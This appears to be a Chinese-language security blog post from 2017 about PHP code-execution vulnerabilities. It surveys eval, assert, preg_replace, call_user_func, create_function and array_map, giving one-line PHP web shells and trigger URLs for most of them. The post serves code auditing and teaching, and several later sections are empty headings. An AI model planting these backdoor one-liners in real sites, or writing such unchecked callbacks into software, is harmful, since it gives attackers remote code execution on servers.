---
title: php代码执行漏洞
date: 2017-07-26 15:49:44
tags: [php,代码审计,代码执行]
categories: Web安全
copyright: true
---
# 常见危险函数
## php代码执行相关
### eval()
```
mixed eval ( string $code )
```
把字符串`code`作为php代码执行。常见的一句话木马：
```php
<?php
	eval($_GET['pass'])
?>
```
访问：
```
http://xxx/codeexec.php?pass=phpinfo();
```
得到phpinfo()页面。

### assert()
PHP 5
```
bool assert ( mixed $assertion [, string $description ] )
```
PHP 7
```
bool assert ( mixed $assertion [, Throwable $exception ] )
```

assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的响应。如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。

一句话木马：
```php
<?php
	assert($_GET['pass']);
?>
```
访问：
```
http://xxx/codeexec.php?pass=phpinfo()
```
phpinfo()后可以不用分号。得到phpinfo()页面。

### preg_replace
```
mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )
```
搜索subject中匹配pattern的部分， 以replacement进行替换。当使用被弃用的 e 修饰符时, 这个函数会转义一些字符，在完成替换后，引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串
更详细的说明见：[php-preg_replace](http://php.net/preg_replace)



### call_user_func()
```
mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] )
```
第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。 传入call_user_func()的参数不能为引用传递。

```php
<?php
	call_user_func($_GET['chybeta'],$_GET['ph0en1x']);
?>
```
访问：
```
http://localhost:2500/codeexec.php?chybeta=assert&ph0en1x=phpinfo()
```

### call_user_func_array()
```
mixed call_user_func_array ( callable $callback , array $param_arr )
```

把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。

```php
<?php
	call_user_func_array($_GET['chybeta'],$_GET['ph0en1x']);
?>
```

访问：
```
http://localhost:2500/codeexec.php?chybeta=assert&ph0en1x[]=phpinfo()
```

### create_function
```
string create_function ( string $args , string $code )
```
该函数的内部实现用到了`eval`，所以也具有相同的安全问题。第一个参数`args`是后面定义函数的参数，第二个参数是函数的代码。

```php
<?php
	$a = $_GET['chybeta'];
	$b = create_function('$a',"echo $a");
	$b('');
?>
```

访问：
```
http://localhost:2500/codeexec.php
?chybeta=phpinfo();
```
### array_map()
```
array array_map ( callable $callback , array $array1 [, array $... ] )
```
作用是为数组的每个元素应用回调函数 。其返回值为数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。

```php
<?php
	$array = array(0,1,2,3,4,5);
	array_map($_GET['chybeta'],$array);
?>
```

访问：
```
http://localhost:2500/codeexec.php
?chybeta=phpinfo
```
注意没有括号`()`和分号`;`。

## 系统命令执行相关
### system()
### passthru()
### exec()
### pcntl_exec()
### shell_exec()
### popen()
### proc_open()
### \`(反单引号)
### ob_start()
### escapeshellcmd()
该函数用于过滤

# php mail()

# 动态函数调用

# 反序列化问题

# LD_PRELOAD绕过

# Refference
+ [Obvious and not so obvious PHP code injection and evaluation](http://php-security.org/2010/05/20/mops-submission-07-our-dynamic-php/index.html)
